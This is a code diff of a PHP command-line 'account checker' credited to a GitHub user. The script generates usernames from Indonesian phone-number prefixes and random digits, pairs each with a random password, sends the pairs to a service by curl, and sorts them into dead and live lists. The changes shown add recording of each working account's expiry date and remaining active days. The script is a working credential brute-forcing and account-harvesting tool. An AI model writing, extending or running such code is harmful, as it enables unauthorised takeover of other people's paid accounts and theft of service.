@@ -43,14 +43,18 @@ print "$cyan    `.  // .'   $white https://github.com/N1ght420 \n";
 print "$cyan    `-------'                                \n\n";
 
 $awal = array("","9813","9812","9811","9853","9852");
+$onenum = array("","1","3","7","8","9");
 echo "$yellow ??$white Total : ";
 $total = trim(fgets(STDIN));
 
 echo "$yellow **$white Creating account list ... \n";
 for ($i=0; $i < $total; $i++){
-    $random = array_rand($awal,3);
-    $base = $awal[$random[1]];
-    $user = $base.user(str_replace("-", "", strlen($base) -15));
+    $length = rand(13,15);
+    $randawal = array_rand($awal,3);
+    $base = $awal[$randawal[1]];
+    $randnum = array_rand($onenum,3);
+    $one = $onenum[$randnum[1]];
+    $user = $base.$one.user(str_replace("-", "", strlen($base) -$length));
     $pass = pass(3);
     fwrite(fopen($list, "a"), "$user|$pass \n");
 }
@@ -82,12 +86,16 @@ foreach ($file as $akon => $data) {
     curl_close($ch);
     $json = json_decode($result);
     $act = $json->act;
+	$exp = $json->expire;
+	// $amount = $json->amount;
+	$duration = $json->duration;
+	// $hour = $json->hour;
 	if ($act == "INVALID") {
         echo "$red //$white DIE!$yellow ->$white $user|$pass \n";
         fwrite(fopen("die.txt", "a"), "$user|$pass \n");
 	}else{
-		echo "$okegreen //$white LIVE$yellow ->$white $user|$pass \n";
-		fwrite(fopen("live.txt", "a"), "$user|$pass \n");
+		echo "$okegreen //$white LIVE until $exp$yellow ->$white $user|$pass \n";
+		fwrite(fopen("live.txt", "a"), "username: $user, password: $pass, Masa aktif $duration hari, hingga $exp WIB. CS:147 \n");
 	}
 	sleep(1);
 }
